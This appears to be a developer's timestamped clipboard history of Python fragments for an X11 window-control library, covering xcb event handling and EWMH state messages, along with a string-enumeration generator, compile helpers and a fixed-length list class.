* Sat 22 Feb 2014 09:53:25 AM JST
,
* Sat 22 Feb 2014 09:53:26 AM JST
,
* Sat 22 Feb 2014 09:53:28 AM JST
,
* Sat 22 Feb 2014 09:53:32 AM JST
,
* Sat 22 Feb 2014 09:53:33 AM JST
,
* Sat 22 Feb 2014 09:53:34 AM JST
,
* Sat 22 Feb 2014 09:53:35 AM JST
,
* Sat 22 Feb 2014 09:53:37 AM JST
,
* Sat 22 Feb 2014 09:53:39 AM JST
,
* Sat 22 Feb 2014 09:53:40 AM JST
,
* Sat 22 Feb 2014 09:53:41 AM JST
,
* Sat 22 Feb 2014 09:53:42 AM JST
,
* Sat 22 Feb 2014 09:53:43 AM JST
,
* Sat 22 Feb 2014 09:53:44 AM JST
,
* Sat 22 Feb 2014 09:53:46 AM JST
,
* Sat 22 Feb 2014 09:53:47 AM JST
,
* Sat 22 Feb 2014 10:28:21 AM JST
permutations
* Sat 22 Feb 2014 10:28:58 AM JST
permutations
* Sat 22 Feb 2014 11:02:38 AM JST
import itertools
def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))
* Sat 22 Feb 2014 11:04:53 AM JST
import itertools
def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

* Sat 22 Feb 2014 11:07:09 AM JST
string.letters + string.digits
* Sat 22 Feb 2014 11:07:16 AM JST

* Sat 22 Feb 2014 11:07:16 AM JST

* Sat 22 Feb 2014 11:07:16 AM JST
chars = string.lowercase

* Sat 22 Feb 2014 11:09:59 AM JST
string.letters + 
* Sat 22 Feb 2014 11:13:04 AM JST
list
* Sat 22 Feb 2014 11:22:05 AM JST
/int 
* Sat 22 Feb 2014 11:26:58 AM JST
name,
* Sat 22 Feb 2014 11:26:58 AM JST
o', name,
* Sat 22 Feb 2014 11:27:16 AM JST
CalledProcessError
* Sat 22 Feb 2014 11:29:55 AM JST
/tmp/junk/
* Sat 22 Feb 2014 11:39:55 AM JST
before = 
for char in iter_wordlists():
    source = path.path(char + '.cc')

* Sat 22 Feb 2014 11:41:06 AM JST

* Sat 22 Feb 2014 11:41:06 AM JST

* Sat 22 Feb 2014 11:41:06 AM JST
        before.rename(str(source))

* Sat 22 Feb 2014 11:41:11 AM JST
char + '.cc'
* Sat 22 Feb 2014 11:42:53 AM JST

* Sat 22 Feb 2014 11:42:53 AM JST

* Sat 22 Feb 2014 11:42:53 AM JST
        source = path.path(char + '.cc')

* Sat 22 Feb 2014 11:43:03 AM JST
before
* Sat 22 Feb 2014 11:43:48 AM JST
source
* Sat 22 Feb 2014 11:44:26 AM JST
path.path('a.out')
* Sat 22 Feb 2014 11:46:08 AM JST
char + '.cc'
* Sat 22 Feb 2014 11:46:11 AM JST

* Sat 22 Feb 2014 11:46:11 AM JST

* Sat 22 Feb 2014 11:46:11 AM JST
        source_name = 

* Sat 22 Feb 2014 11:48:53 AM JST
aout = path.path('a.out')
* Sat 22 Feb 2014 11:50:59 AM JST
source = path.path('a.cc')
* Sat 22 Feb 2014 11:52:15 AM JST
source = path.path('a.cc')
* Sat 22 Feb 2014 11:52:20 AM JST
gcompile(str(source))
* Sat 22 Feb 2014 11:53:10 AM JST
gcompile(str(source))
* Sat 22 Feb 2014 11:53:18 AM JST
basesize = path.path('a.out').getsize() - 1
* Sat 22 Feb 2014 11:56:41 AM JST
sys.stdout.flush()
* Sat 22 Feb 2014 01:00:08 PM JST
    source = path.path('a.cc')
    gcompile(str(source))
    basesize = path.path('a.out').getsize() - 1

* Sat 22 Feb 2014 01:00:58 PM JST
iter_wordlists()
* Sat 22 Feb 2014 01:02:43 PM JST

* Sat 22 Feb 2014 01:02:43 PM JST

* Sat 22 Feb 2014 01:02:43 PM JST
    for char in iterchar:

* Sat 22 Feb 2014 01:02:48 PM JST
char
* Sat 22 Feb 2014 01:03:12 PM JST
iterchar.next()
* Sat 22 Feb 2014 01:06:03 PM JST
expected
* Sat 22 Feb 2014 01:06:17 PM JST
expect:
* Sat 22 Feb 2014 01:07:05 PM JST

* Sat 22 Feb 2014 01:07:05 PM JST

* Sat 22 Feb 2014 01:07:06 PM JST
    while iterchar:

* Sat 22 Feb 2014 01:18:40 PM JST
pickle
* Sat 22 Feb 2014 01:27:31 PM JST
    source = path.path('a.cc')
    gcompile(str(source))
    basesize = path.path('a.out').getsize() - 1

* Sat 22 Feb 2014 01:28:10 PM JST
SOURCE = path.path('a.cc')
gcompile(str(SOURCE))
BASESIZE = path.path('a.out').getsize() - 1

* Sat 22 Feb 2014 01:28:45 PM JST
char
* Sat 22 Feb 2014 01:30:38 PM JST
def gcompile(name):
    r"""SUMMARY

    compile(name)

    @Arguments:
    - `name`:

    @Return:
    """
    check_call(('g++', name))


* Sat 22 Feb 2014 01:31:57 PM JST
SOURCE = path.path('a.cc')
gcompile(str(SOURCE))
BASESIZE = path.path('a.out').getsize() - 1

* Sat 22 Feb 2014 01:34:05 PM JST
SOURCE
* Sat 22 Feb 2014 01:36:39 PM JST
checkpickle
* Sat 22 Feb 2014 01:37:50 PM JST
PICKLE_DATA, SOURCE, BASESIZE
* Sat 22 Feb 2014 01:42:37 PM JST
Catched
* Sat 22 Feb 2014 01:43:36 PM JST
StopCatched
* Sat 22 Feb 2014 01:44:27 PM JST
print('=============================================================')
* Sat 22 Feb 2014 04:27:19 PM JST
window
* Sat 22 Feb 2014 04:49:37 PM JST
~/.pylib/
* Sat 22 Feb 2014 04:58:45 PM JST
check_chrome
* Sat 22 Feb 2014 04:59:09 PM JST
    chrome_path = '/opt/google/chrome/chrome'
    chrome = path(chrome_path)

* Sat 22 Feb 2014 04:59:31 PM JST
not
* Sat 22 Feb 2014 05:00:20 PM JST
/root/.zsh/scripts/
* Sat 22 Feb 2014 05:10:39 PM JST

* Sat 22 Feb 2014 05:10:39 PM JST

* Sat 22 Feb 2014 05:10:39 PM JST
# 0.1.1 2014/02/22 Added chrome_root and chrome_hash

* Sat 22 Feb 2014 05:20:54 PM JST
LOGGER.warning('OSError')
* Sat 22 Feb 2014 05:29:31 PM JST
removedirs()
* Sat 22 Feb 2014 05:29:47 PM JST
removep
* Sat 22 Feb 2014 05:30:29 PM JST
rmtree_p
* Sat 22 Feb 2014 05:52:59 PM JST
Class 
* Sat 22 Feb 2014 06:02:54 PM JST
PropertyNotifyEvent
* Sat 22 Feb 2014 06:09:26 PM JST
LASTEvent              = 35
* Sat 22 Feb 2014 06:09:29 PM JST
LASTEvent              = 35    # must be bigger than any event
* Sat 22 Feb 2014 06:18:07 PM JST
/usr/share/pyshared/Xlib/protocol/
* Sat 22 Feb 2014 06:18:28 PM JST
event_class
* Sat 22 Feb 2014 06:49:39 PM JST
window_resize
* Sat 22 Feb 2014 06:59:41 PM JST
parse
* Sat 22 Feb 2014 07:05:15 PM JST
anything
* Sat 22 Feb 2014 07:05:16 PM JST
anything-c-moccur-occur-by-moccur
* Sat 22 Feb 2014 07:05:58 PM JST
anything-c-moccur-occur-by-moccur
* Sat 22 Feb 2014 07:06:02 PM JST
moccur
* Sat 22 Feb 2014 07:06:02 PM JST
by-moccur
* Sat 22 Feb 2014 07:06:03 PM JST
occur-by-moccur
* Sat 22 Feb 2014 10:45:16 PM JST
prin
* Sat 22 Feb 2014 10:51:10 PM JST
@do_it.when('isinstance(name, str)')
* Sat 22 Feb 2014 10:51:17 PM JST
str
* Sat 22 Feb 2014 10:54:49 PM JST
        
* Sat 22 Feb 2014 10:57:08 PM JST
isinsta
* Sat 22 Feb 2014 10:58:29 PM JST
    #         name = AtomName(self, str_or_int)
    #         atom = self.intern_atom(str_or_int)
    #         return AtomPair(name, atom)

* Sat 22 Feb 2014 10:58:41 PM JST
str_or_int
* Sat 22 Feb 2014 10:59:04 PM JST
atom_
* Sat 22 Feb 2014 10:59:07 PM JST
atom
* Sat 22 Feb 2014 10:59:54 PM JST
    #         atom = AtomNumber(self, str_or_int)
    #         name = self.get_atom_name(str_or_int)
    #         return AtomPair(name, atom)
    #     raise ValueError()

* Sat 22 Feb 2014 10:59:56 PM JST
    #         atom = AtomNumber(self, str_or_int)
    #         name = self.get_atom_name(str_or_int)
    #         return AtomPair(name, atom)

* Sat 22 Feb 2014 11:00:11 PM JST
str_or_int
* Sat 22 Feb 2014 11:00:16 PM JST
atom
* Sat 22 Feb 2014 11:00:19 PM JST
str_or_int
* Sat 22 Feb 2014 11:00:21 PM JST
atom
* Sat 22 Feb 2014 11:01:12 PM JST
make
* Sat 22 Feb 2014 11:02:21 PM JST
on
* Sat 22 Feb 2014 11:02:23 PM JST
on
* Sat 22 Feb 2014 11:03:33 PM JST
atom'
* Sun 23 Feb 2014 09:10:20 AM JST
         import xcb                                                                         
         import xcb.xproto as xproto                                                        
         from xcb.xproto import ConfigWindow as cw                                          
                                                                                            
         conn = xcb.connect()                                                               
         root = conn.get_setup().roots[0].root                                              
         eventmask = [xproto.EventMask.SubstructureRedirect]                                
         err =conn.core.ChangeWindowAttributesChecked(root, xproto.CW.EventMask, eventmask) 
         check = err.check()                                                                
         if check:                                                                          
             print check                                                                    
                                                                                            
         while True:                                                                        
             e = conn.wait_for_event()                                                      
                                                                                            
             if isinstance(e, xproto.MapRequestEvent):                                      
                 conn.core.MapWindow(e.window)                                              
                                                                                            
             if isinstance(e, xproto.ConfigureRequestEvent):                                
                 y = x = w = h = bw = 0                                                     
up vote          if e.value_mask & cw.X:                                                    
0 down               x = e.x                                                                
vote                 print "x:", x                                                          
favorite         if e.value_mask & cw.Y:                                                    
                     y = e.y                                                                
                     print "y:", y                                                          
                 if e.value_mask & cw.Height:                                               
                     h = e.height                                                           
                     print "h:", h                                                          
                 if e.value_mask & cw.Width:                                                
                     w = e.width                                                            
                     print 'w:', w                                                          
                 if e.value_mask & cw.BorderWidth:                                          
                     bw = e.border_width                                                    
                     print 'bw:', bw                                                        
                 mask = cw.X | cw.Y |  cw.Width | cw.Height | cw.BorderWidth                
                 values = {cw.X: x, cw.Y: y, cw.Width:  w, cw.Height: h, cw.BorderWidth: bw}
                 err = conn.core.ConfigureWindowChecked(e.window, mask, values)             
                 err.check()                                                                
             conn.flush()                                                                   
             print e                                                                        

* Sun 23 Feb 2014 09:10:42 AM JST
up vote  
* Sun 23 Feb 2014 09:10:44 AM JST
0 down   
* Sun 23 Feb 2014 09:10:46 AM JST
vote
* Sun 23 Feb 2014 09:10:47 AM JST
favorite  
* Sun 23 Feb 2014 09:15:49 AM JST
PropMode
* Sun 23 Feb 2014 09:15:55 AM JST
SetMode
* Sun 23 Feb 2014 09:16:19 AM JST
StackMode
* Sun 23 Feb 2014 09:21:52 AM JST
http://nullege.com/codes/show/src%40q%40t%40qtile-HEAD%40libqtile%40window.py/23/xcb.xproto.StackMode/python#fullsrc
* Sun 23 Feb 2014 09:24:48 AM JST
git://github.com/cortesi/qtile.git
* Sun 23 Feb 2014 09:34:20 AM JST
Above
* Sun 23 Feb 2014 09:34:21 AM JST
StackMode.Above
* Sun 23 Feb 2014 09:34:58 AM JST
54651346
* Sun 23 Feb 2014 09:36:56 AM JST
mask = 
* Sun 23 Feb 2014 09:38:01 AM JST
ConfigWindow
* Sun 23 Feb 2014 09:39:31 AM JST
54651346
* Sun 23 Feb 2014 09:41:13 AM JST
xcb.xproto.ConfigWindow
* Sun 23 Feb 2014 09:42:47 AM JST
from xcb.xproto import ConfigWindow as cw
* Sun 23 Feb 2014 09:42:55 AM JST
mask = cw.X | cw.Y |  cw.Width | cw.Height | cw.BorderWidth
* Sun 23 Feb 2014 09:44:13 AM JST
cw.X | cw.Y |  cw.Width | cw.Height | cw.BorderWidth
* Sun 23 Feb 2014 09:45:08 AM JST
mask = cw.X | cw.Y |  cw.Width | cw.Height | cw.BorderWidth
* Sun 23 Feb 2014 09:45:20 AM JST
values = {cw.X: x, cw.Y: y, cw.Width:  w, cw.Height: h, cw.BorderWidth: bw}
* Sun 23 Feb 2014 09:48:25 AM JST
conn.core.ChangeWindowAttributesChecked(root, xproto.CW.EventMask, eventmask)
* Sun 23 Feb 2014 09:49:09 AM JST
http://nullege.com/codes/show/src%40q%40t%40qtile-HEAD%40libqtile%40window.py/23/xcb.xproto.StackMode/python#fullsrc
* Sun 23 Feb 2014 09:51:27 AM JST
git://github.com/tadfisher/rama.git
* Sun 23 Feb 2014 11:03:30 AM JST
StackMode
* Sun 23 Feb 2014 11:04:21 AM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Sun 23 Feb 2014 11:12:11 AM JST
junk.
* Sun 23 Feb 2014 11:12:11 AM JST
111209.junk.
* Sun 23 Feb 2014 11:12:11 AM JST
23-111209.junk.
* Sun 23 Feb 2014 11:12:12 AM JST
02-23-111209.junk.
* Sun 23 Feb 2014 11:12:12 AM JST
2014-02-23-111209.junk.
* Sun 23 Feb 2014 11:14:00 AM JST
ClientMessageEvent
* Sun 23 Feb 2014 11:50:26 AM JST
ClientMessageEvent
* Sun 23 Feb 2014 11:50:40 AM JST
xcb.core.ClientMessageEvent
* Sun 23 Feb 2014 11:50:45 AM JST
xcb
* Sun 23 Feb 2014 11:52:15 AM JST
from xautohotkey.events import Events
* Sun 23 Feb 2014 11:52:23 AM JST
Events.ClientMessage
* Sun 23 Feb 2014 11:53:06 AM JST
Event
* Sun 23 Feb 2014 11:55:09 AM JST
ClientMessageEvent
* Sun 23 Feb 2014 11:56:00 AM JST
core
* Sun 23 Feb 2014 11:56:01 AM JST
xcb.core
* Sun 23 Feb 2014 12:03:23 PM JST
xprotoExtension
* Sun 23 Feb 2014 12:08:18 PM JST
struct.
* Sun 23 Feb 2014 12:09:12 PM JST
BH7I
* Sun 23 Feb 2014 12:10:10 PM JST
H7I
* Sun 23 Feb 2014 12:11:16 PM JST
54525997
* Sun 23 Feb 2014 12:14:01 PM JST
NET_WM_STATE
* Sun 23 Feb 2014 12:15:00 PM JST
import cStringIO
buf = cStringIO.StringIO()

buf.write(pack('B', Events.ClientMessage))
format_ = 32
buf.write(pack('B', format_))
buf.write(pack('H', 0))
window_id = 54525997
buf.write(pack('I', window_id))
NET_WM_STATE = 296
buf.write(pack('I', NET_WM_STATE))

* Sun 23 Feb 2014 12:15:14 PM JST
import cStringIO
buf = cStringIO.StringIO()

buf.write(pack('B', Events.ClientMessage))
format_ = 32
buf.write(pack('B', format_))
buf.write(pack('H', 0))
window_id = 54525997
buf.write(pack('I', window_id))
NET_WM_STATE = 296
buf.write(pack('I', NET_WM_STATE))

* Sun 23 Feb 2014 12:16:57 PM JST
IIIII
* Sun 23 Feb 2014 12:19:05 PM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Sun 23 Feb 2014 12:19:15 PM JST
           
* Sun 23 Feb 2014 12:19:28 PM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Sun 23 Feb 2014 01:07:15 PM JST
data, 
* Sun 23 Feb 2014 02:48:00 PM JST
pack()
* Sun 23 Feb 2014 02:55:07 PM JST
parse
* Sun 23 Feb 2014 02:56:07 PM JST
name
* Sun 23 Feb 2014 02:56:13 PM JST
structcode
* Sun 23 Feb 2014 02:57:18 PM JST
Bool
* Sun 23 Feb 2014 04:08:02 PM JST
self, 
* Mon 24 Feb 2014 11:46:59 AM JST
    
* Mon 24 Feb 2014 11:47:02 AM JST
    
* Mon 24 Feb 2014 11:54:57 AM JST
None
* Mon 24 Feb 2014 11:54:59 AM JST
None
* Mon 24 Feb 2014 11:55:01 AM JST
None
* Mon 24 Feb 2014 11:55:02 AM JST
None
* Mon 24 Feb 2014 11:55:03 AM JST
None
* Mon 24 Feb 2014 12:09:33 PM JST
_mode
* Mon 24 Feb 2014 12:09:34 PM JST
self._mode
* Mon 24 Feb 2014 12:11:17 PM JST

* Mon 24 Feb 2014 12:11:17 PM JST

* Mon 24 Feb 2014 12:11:17 PM JST
        if not isinstance(mode, class_or_type_tuple):

* Mon 24 Feb 2014 12:13:01 PM JST
Predefin
* Mon 24 Feb 2014 12:14:26 PM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Mon 24 Feb 2014 12:14:35 PM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Mon 24 Feb 2014 12:16:12 PM JST
Connection
* Mon 24 Feb 2014 12:23:31 PM JST
'_NET_WM_STATE_FULLSCREEN'
* Mon 24 Feb 2014 12:23:43 PM JST
    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        con = Connection.get_instance(display=self.display)
        _d2 = con.core.atom.identify_atom(self._d2)
        _d3 = con.core.atom.identify_atom(self._d3)
        return pack(self._structfmt,
                    self._d1, _d2, _d3, self._d4, self._d5)

* Mon 24 Feb 2014 12:24:25 PM JST

* Mon 24 Feb 2014 12:24:25 PM JST

* Mon 24 Feb 2014 12:24:25 PM JST
        _d3 = con.core.atom.identify_atom(self._d3)

* Mon 24 Feb 2014 12:25:23 PM JST
    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        con = Connection.get_instance(display=self.display)
        _d2 = con.core.atom.identify_atom(self._d2)
        return pack(self._structfmt,
                    self._d1, _d2, self._d3, self._d4, self._d5)

* Mon 24 Feb 2014 12:42:31 PM JST
mode
* Mon 24 Feb 2014 12:43:14 PM JST
        @Return:
* Mon 24 Feb 2014 12:44:30 PM JST
mode, 
* Mon 24 Feb 2014 12:48:08 PM JST
mode
* Mon 24 Feb 2014 12:48:16 PM JST
    @abstractmethod
    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        # example
        return pack(self._structfmt,
                    self._d1, self._d2, self._d3, self._d4, self._d5)

* Mon 24 Feb 2014 12:49:15 PM JST
_d1
* Mon 24 Feb 2014 12:49:15 PM JST
self._d1
* Mon 24 Feb 2014 12:49:23 PM JST

* Mon 24 Feb 2014 12:49:23 PM JST

* Mon 24 Feb 2014 12:49:23 PM JST
        # example

* Mon 24 Feb 2014 12:49:50 PM JST
mode
* Mon 24 Feb 2014 12:50:58 PM JST
mode
* Mon 24 Feb 2014 12:52:18 PM JST
from abc import abstractmethod, ABCMeta
* Mon 24 Feb 2014 12:52:32 PM JST
class Data2(object):
    r"""
    """
    _structfmt = 'BBHII5I'

    _atom = 0

    _data1 = 0
    _data2 = 0
    _data3 = 0
    _data4 = 0
    _data5 = 0

    def __init__(self, window_id, format_=32):
        r"""SUMMARY

        __init__(window_id, format_=32)

        @Arguments:
        - `window_id`:
        - `format_`:

        @Return:
        """
        self.window_id = window_id
        self.format = format_

* Mon 24 Feb 2014 12:52:43 PM JST
class PredefineDataAbstract(object):
    r"""
    """
    __metaclass__ = ABCMeta

    _structfmt = '5I'

    _d1 = 0
    _d2 = 0
    _d3 = 0
    _d4 = 0
    _d5 = 0

    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        self.display = display = ''

    # @abstractmethod
    # def pack(self, ):
    #     r"""SUMMARY

    #     pack()

    #     @Return:
    #     """
    #     # example
    #     return pack(self._structfmt,
    #                 self._d1, self._d2, self._d3, self._d4, self._d5)


class PredefineModeDataAbstract(PredefineDataAbstract):
    r"""
    """
    MODE_UNSET = 0
    MODE_SET = 1
    MODE_TOGGLE = 2

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `display`:
        - `mode`:
        """
        PredefineDataAbstract.__init__(display=display)

    @abstractmethod
    def pack(self, mode):
        r"""SUMMARY

        pack()

        @Return:
        """
        # example
        # self._d1 = mode
        # return pack(self._structfmt,
        #             self._d1, self._d2, self._d3, self._d4, self._d5)

    def unset(self, ):
        r"""SUMMARY

        unset()

        @Return:
        """
        return self.pack(self.MODE_UNSET)

    def set(self, ):
        r"""SUMMARY

        set()

        @Return:
        """
        return self.pack(self.MODE_SET)

    def toggle(self, ):
        r"""SUMMARY

        toggle()

        @Return:
        """
        return self.pack(self.MODE_TOGGLE)


class MaximizeStateData(PredefineModeDataAbstract):
    r"""
    """

    _d2 = '_NET_WM_STATE_MAXIMIZED_VERT'
    _d3 = '_NET_WM_STATE_MAXIMIZED_HORZ'

    def pack(self, mode):
        r"""SUMMARY

        pack()

        @Return:
        """
        con = Connection.get_instance(display=self.display)
        self._d1 = mode
        _d2 = con.core.atom.identify_atom(self._d2)
        _d3 = con.core.atom.identify_atom(self._d3)
        return pack(self._structfmt,
                    self._d1, _d2, _d3, self._d4, self._d5)


class PredefineModeData2Abstract(PredefineModeDataAbstract):
    r"""
    """

    def pack(self, mode):
        r"""SUMMARY

        pack()

        @Return:
        """
        con = Connection.get_instance(display=self.display)
        _d2 = con.core.atom.identify_atom(self._d2)
        return pack(self._structfmt,
                    mode, _d2, self._d3, self._d4, self._d5)


class FullscreenStateData(PredefineModeData2Abstract):
    r"""
    """

    _d2 = '_NET_WM_STATE_FULLSCREEN'


class ShadeStateData(PredefineModeData2Abstract):
    r"""
    """

    _d2 = '_NET_WM_STATE_SHADED'


class AboveStateData(PredefineModeData2Abstract):
    r"""
    """

    _d2 = '_NET_WM_STATE_ABOVE'


class BelowStateData(PredefineModeData2Abstract):
    r"""
    """

    _d2 = '_NET_WM_STATE_BELOW'

* Mon 24 Feb 2014 12:52:59 PM JST
from xautohotkey.xconnection import Connection
* Mon 24 Feb 2014 12:53:10 PM JST
from struct import pack
* Mon 24 Feb 2014 12:54:39 PM JST
AboveStateData
* Mon 24 Feb 2014 01:31:33 PM JST
get_toggle
* Mon 24 Feb 2014 01:34:22 PM JST

* Mon 24 Feb 2014 01:34:23 PM JST

* Mon 24 Feb 2014 01:34:23 PM JST
    @abstractmethod

* Mon 24 Feb 2014 01:34:24 PM JST

* Mon 24 Feb 2014 01:34:24 PM JST

* Mon 24 Feb 2014 01:34:25 PM JST
        # example

* Mon 24 Feb 2014 01:34:40 PM JST
Predefine
* Mon 24 Feb 2014 01:35:11 PM JST
PredefineDataAbstract
* Mon 24 Feb 2014 01:35:29 PM JST
mode
* Mon 24 Feb 2014 01:37:20 PM JST
Predefine
* Mon 24 Feb 2014 01:37:35 PM JST
ModeDataMaker
* Mon 24 Feb 2014 01:37:48 PM JST
mode
* Mon 24 Feb 2014 01:38:04 PM JST

* Mon 24 Feb 2014 01:38:04 PM JST

* Mon 24 Feb 2014 01:38:04 PM JST
        self._d1 = mode

* Mon 24 Feb 2014 01:38:24 PM JST
ModeDataMaker
* Mon 24 Feb 2014 01:38:49 PM JST
Mode
* Mon 24 Feb 2014 01:38:57 PM JST
Mode
* Mon 24 Feb 2014 01:39:04 PM JST
Mode
* Mon 24 Feb 2014 01:39:34 PM JST
mode
* Mon 24 Feb 2014 01:40:12 PM JST
mod
* Mon 24 Feb 2014 01:41:41 PM JST
StateDataMakerBySingleAtom
* Mon 24 Feb 2014 01:42:09 PM JST
StateDataMakerBySingleAtom
* Mon 24 Feb 2014 01:45:49 PM JST
ImplementationError
* Mon 24 Feb 2014 01:46:34 PM JST
self
* Mon 24 Feb 2014 01:47:37 PM JST
StateDataMaker
* Mon 24 Feb 2014 05:48:09 PM JST

* Mon 24 Feb 2014 05:48:09 PM JST

* Mon 24 Feb 2014 05:48:09 PM JST
    def __getitem__(self, key):

* Mon 24 Feb 2014 06:10:19 PM JST
ValueError
* Mon 24 Feb 2014 06:12:27 PM JST
        if not 0 <= i <= 5:
            # TODO: (Atami) [2014/02/24]
            raise KeyError()

* Mon 24 Feb 2014 06:13:20 PM JST
        if not 0 <= i <= 5:
            # TODO: (Atami) [2014/02/24]
            raise KeyError()

* Mon 24 Feb 2014 06:13:35 PM JST
    def __getslice__(self, i, j):
        i = max(i, 0); j = max(j, 0)
        return self.__class__(self.data[i:j])

* Mon 24 Feb 2014 06:16:19 PM JST
Mutable
* Mon 24 Feb 2014 06:17:34 PM JST
DictUtil
* Mon 24 Feb 2014 06:20:38 PM JST
UserListp
* Mon 24 Feb 2014 06:25:44 PM JST
[0, 0, 0, 0, 0]
* Mon 24 Feb 2014 06:26:55 PM JST

* Mon 24 Feb 2014 06:26:55 PM JST

* Mon 24 Feb 2014 06:26:55 PM JST
        i = max(i, 0); j = max(j, 0)

* Mon 24 Feb 2014 06:27:20 PM JST
        if not 0 <= i <= 5:
            # TODO: (Atami) [2014/02/24]
            raise KeyError()

* Mon 24 Feb 2014 06:27:32 PM JST
__class__
* Mon 24 Feb 2014 06:27:32 PM JST
self.__class__
* Mon 24 Feb 2014 06:27:47 PM JST
        for arg in (i, j):
            if not 0 <= arg <= 5:
                # TODO: (Atami) [2014/02/24]
                raise KeyError()

* Mon 24 Feb 2014 06:28:07 PM JST
        for arg in (i, j):
            if not 0 <= arg <= 5:
                # TODO: (Atami) [2014/02/24]
                raise KeyError()

* Mon 24 Feb 2014 06:28:56 PM JST
        zerofill = [0, 0, 0, 0, 0]
        self.data = (self.data + zerofill)[:len(zerofill)]

* Mon 24 Feb 2014 06:42:07 PM JST
list(
* Mon 24 Feb 2014 06:48:19 PM JST
self.__checkindex(i)
* Mon 24 Feb 2014 06:48:30 PM JST
        self.__checkindex(i)

* Mon 24 Feb 2014 06:48:55 PM JST
        self.__checkindex(i)
        self.__checkindex(j)

* Mon 24 Feb 2014 06:52:39 PM JST
    def __setslice__(self, i, j, other):
        i = max(i, 0); j = max(j, 0)
        if isinstance(other, UserList):
            self.data[i:j] = other.data
        elif isinstance(other, type(self.data)):
            self.data[i:j] = other
        else:
            self.data[i:j] = list(other)

* Mon 24 Feb 2014 06:52:46 PM JST
        self.__checkindex(i)
        self.__checkindex(j)

* Mon 24 Feb 2014 06:52:49 PM JST

* Mon 24 Feb 2014 06:52:49 PM JST

* Mon 24 Feb 2014 06:52:49 PM JST
        i = max(i, 0); j = max(j, 0)

* Mon 24 Feb 2014 06:52:54 PM JST
UserList
* Mon 24 Feb 2014 06:53:03 PM JST
__class__
* Mon 24 Feb 2014 06:53:03 PM JST
self.__class__
* Mon 24 Feb 2014 10:32:49 PM JST
limitedlist
* Mon 24 Feb 2014 10:33:31 PM JST
limit
* Mon 24 Feb 2014 10:34:55 PM JST
self.
* Mon 24 Feb 2014 10:41:53 PM JST
self)
* Mon 24 Feb 2014 10:41:53 PM JST
repr(self)
* Mon 24 Feb 2014 10:48:31 PM JST
ll[0:3] = ('hello' 'w', 'y')
* Mon 24 Feb 2014 10:54:55 PM JST

* Mon 24 Feb 2014 10:54:55 PM JST

* Mon 24 Feb 2014 10:54:55 PM JST
        print('DEBUG-1-limitlist.py')

* Mon 24 Feb 2014 11:13:24 PM JST
self[:] + 
* Mon 24 Feb 2014 11:17:58 PM JST
length = self._length + other._length
* Mon 24 Feb 2014 11:18:10 PM JST
_
* Mon 24 Feb 2014 11:18:11 PM JST
self._
* Mon 24 Feb 2014 11:18:16 PM JST
return self.__class__(list(other) + list(self), length=length)
* Mon 24 Feb 2014 11:18:24 PM JST
return 
* Mon 24 Feb 2014 11:20:13 PM JST
if is:
* Mon 24 Feb 2014 11:21:41 PM JST

* Mon 24 Feb 2014 11:21:41 PM JST

* Mon 24 Feb 2014 11:21:41 PM JST
            raise ValueError()

* Mon 24 Feb 2014 11:21:42 PM JST
            raise ValueError()

* Mon 24 Feb 2014 11:21:42 PM JST
            raise ValueError()
        # return

* Mon 24 Feb 2014 11:21:44 PM JST

* Mon 24 Feb 2014 11:21:44 PM JST

* Mon 24 Feb 2014 11:21:44 PM JST
            raise StandardError()

* Mon 24 Feb 2014 11:25:09 PM JST
__ismax
* Mon 24 Feb 2014 11:26:54 PM JST
return T
* Mon 24 Feb 2014 11:26:57 PM JST
if 
* Mon 24 Feb 2014 11:29:36 PM JST
        if self._length < len(self) + len(other):
            # TODO: (Atami) [2014/02/24]
            # LimitError
            raise StandardError()

* Mon 24 Feb 2014 11:40:54 PM JST
pass
* Mon 24 Feb 2014 11:42:18 PM JST
MaxLimitedError
* Mon 24 Feb 2014 11:49:32 PM JST
initlist=None, length=None
* Mon 24 Feb 2014 11:50:39 PM JST
        if initlist is not None:
            list.__init__(self, initlist)

* Mon 24 Feb 2014 11:55:12 PM JST
[self._fill] * self._length
* Mon 24 Feb 2014 11:55:41 PM JST
[self._fill] * self._length
* Mon 24 Feb 2014 11:55:45 PM JST

* Mon 24 Feb 2014 11:55:45 PM JST

* Mon 24 Feb 2014 11:55:46 PM JST
        fill = 

* Mon 24 Feb 2014 11:58:27 PM JST
List
* Tue 25 Feb 2014 12:11:44 AM JST
ListF
* Tue 25 Feb 2014 12:21:30 AM JST
remove
* Tue 25 Feb 2014 12:39:47 AM JST

* Tue 25 Feb 2014 12:39:47 AM JST

* Tue 25 Feb 2014 12:39:47 AM JST
from abc import abstractmethod, ABCMeta

* Tue 25 Feb 2014 12:39:48 AM JST
from abc import abstractmethod, ABCMeta

* Tue 25 Feb 2014 12:39:48 AM JST
from abc import abstractmethod, ABCMeta
import collections

* Tue 25 Feb 2014 12:40:47 AM JST

* Tue 25 Feb 2014 12:40:48 AM JST

* Tue 25 Feb 2014 12:40:48 AM JST
    _d0, _d1, _d2, _d3, _d4 = 0, 0, 0, 0, 0

* Tue 25 Feb 2014 12:40:54 AM JST
_d0
* Tue 25 Feb 2014 12:40:59 AM JST
_d1
* Tue 25 Feb 2014 12:41:04 AM JST
_d2
* Tue 25 Feb 2014 12:41:10 AM JST
_d3
* Tue 25 Feb 2014 12:41:28 AM JST
                    
* Tue 25 Feb 2014 12:42:15 AM JST

* Tue 25 Feb 2014 12:42:15 AM JST

* Tue 25 Feb 2014 12:42:15 AM JST
        self.data = ListFill(length=5, fill=0)

* Tue 25 Feb 2014 12:42:23 AM JST
self.
* Tue 25 Feb 2014 12:42:44 AM JST
_d0
* Tue 25 Feb 2014 12:42:52 AM JST
_d0
* Tue 25 Feb 2014 12:43:01 AM JST
_d1
* Tue 25 Feb 2014 12:43:24 AM JST
